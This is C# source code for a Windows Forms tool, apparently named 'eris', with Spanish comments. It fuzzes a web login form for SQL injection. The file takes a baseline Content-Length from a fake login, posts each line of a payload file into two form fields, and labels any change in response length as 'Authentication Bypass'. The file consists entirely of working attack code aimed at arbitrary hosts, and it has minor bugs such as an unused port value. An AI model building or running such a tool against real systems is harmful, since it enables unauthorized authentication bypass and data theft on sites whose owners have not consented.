using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net.NetworkInformation;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace eris
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            label1.ForeColor = System.Drawing.Color.Red;
            label1.Text = "Parado";
            CheckForIllegalCrossThreadCalls = false;
        }
        Thread myThread = null;

        public void _SQLi(string _host, string _path, string _port, string _par1, string _par2)
        {
            
            int port = Int32.Parse(_port);

            string[] requestLines = File.ReadAllLines(_path);
            int numeroLineas = requestLines.Length;
            progressBar1.Maximum = numeroLineas;
            progressBar1.Value = 0;
            OutPut.Items.Clear();
            //Obtencion del Content-Lenght con un falso Login
            string strIdTest = "badLogin";
            string strNameTest = "badLogin";

            ASCIIEncoding encodingTest = new ASCIIEncoding();
            string postDataTest = _par1 + "=" + strIdTest;
            postDataTest += ("&" + _par2 + "=" + strNameTest);
            byte[] dataTest = encodingTest.GetBytes(postDataTest);

            // web request...
            HttpWebRequest myRequestTest =
              (HttpWebRequest)WebRequest.Create(_host);

            myRequestTest.Method = "POST"; 

            myRequestTest.ContentType = "application/x-www-form-urlencoded";
            myRequestTest.ContentLength = dataTest.Length;
            Stream newStreamTest = myRequestTest.GetRequestStream();
            // Envio de datos
            newStreamTest.Write(dataTest, 0, dataTest.Length);

            newStreamTest.Close();
            //Obtencion del Stream asociado al Response.
            HttpWebResponse myHttpWebResponseTest = (HttpWebResponse)myRequestTest.GetResponse();
            //Obteniendo el Content-Length para saber si hay un SQLi o no (Al variar la longitud del HTML)
            string _content = string.Empty;
            StringBuilder requestBuilder1 = new StringBuilder();
            for (int j = 0; j < myHttpWebResponseTest.Headers.Count; ++j)
            {
                requestBuilder1.Append(myHttpWebResponseTest.Headers.Keys[j] + " " + myHttpWebResponseTest.Headers[j] + "\n");
                if (myHttpWebResponseTest.Headers.Keys[j].StartsWith("Content-Length"))
                {
                    _content = myHttpWebResponseTest.Headers[j].Split(' ')[0].Replace("\r", string.Empty);
                }
            }
            //MessageBox.Show(_content);
            foreach (string line in requestLines)
            {
                
                label1.ForeColor = Color.Green;
                label1.Text = "Fuzzing SQLi y payloads: " + line;
                string strId = line;
                string strName = line;
                
                ASCIIEncoding encoding = new ASCIIEncoding();
                string postData = _par1 + "=" + strId;
                postData += ("&" + _par2 + "=" + strName);
                byte[] data = encoding.GetBytes(postData);

                // web request...
                HttpWebRequest myRequest =
                  (HttpWebRequest)WebRequest.Create(_host);


                myRequest.Method = "POST"; 

                myRequest.ContentType = "application/x-www-form-urlencoded";
                myRequest.ContentLength = data.Length;
                Stream newStream = myRequest.GetRequestStream();
                // Envio de datos.
                newStream.Write(data, 0, data.Length);

                newStream.Close();
                HttpWebResponse myHttpWebResponse = (HttpWebResponse)myRequest.GetResponse();
                Stream receiveStream = myHttpWebResponse.GetResponseStream();
                Encoding encode = System.Text.Encoding.GetEncoding("utf-8");
                StreamReader readStream = new StreamReader(receiveStream, encode);
                string _contentActual = string.Empty;
                StringBuilder requestBuilder = new StringBuilder();
                for (int j = 0; j < myHttpWebResponse.Headers.Count; ++j)
                {
                    requestBuilder.Append(myHttpWebResponseTest.Headers.Keys[j] + " " + myHttpWebResponse.Headers[j] + "\n");
                    if (myHttpWebResponse.Headers.Keys[j].StartsWith("Content-Length"))
                    {
                        _contentActual = myHttpWebResponse.Headers[j].Split(' ')[0].Replace("\r", string.Empty);
                    }
                }

                Char[] read = new Char[1024];  
                int count = readStream.Read(read, 0, 1024);
                while (count > 0)
                {
                    String str = new String(read, 0, count);
                    if (_content == _contentActual)
                        OutPut.Items.Add(new ListViewItem(new String[] { line, "Nada..." }));
                    
                    else
                        OutPut.Items.Add(new ListViewItem(new String[] { line, "Authentication Bypass" }));
                    
                    count = readStream.Read(read, 0, 1024);
                }

                myHttpWebResponse.Close();
                readStream.Close();

                progressBar1.Value += 1;
            }
            label1.Text = "Realizado con exito!";
            int _contador = OutPut.Items.Count;
            MessageBox.Show("Escaneo realizado!\nLanzado " + _contador.ToString() + " payloads.", "Hecho", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void scan_Click(object sender, EventArgs e)
        {
            if (ipAddress.Text == string.Empty)
            {
                MessageBox.Show("No se ha introducido ninguna IP.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (Port.Text == string.Empty)
            {
                MessageBox.Show("No se ha introducido ningun puerto.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (par1.Text == string.Empty)
            {
                MessageBox.Show("No se ha introducido ningun parametro.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (par2.Text == string.Empty)
            {
                MessageBox.Show("No se ha introducido ningun parametro.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                    myThread = new Thread(() => _SQLi(ipAddress.Text, payloadsPath.Text, Port.Text, par1.Text, par2.Text));
                    myThread.Start();

                    if (myThread.IsAlive == true)
                    {
                        stop.Enabled = true;
                        scan.Enabled = false;
                        ipAddress.Enabled = false;
                    }
                


            }
        }
    }
}
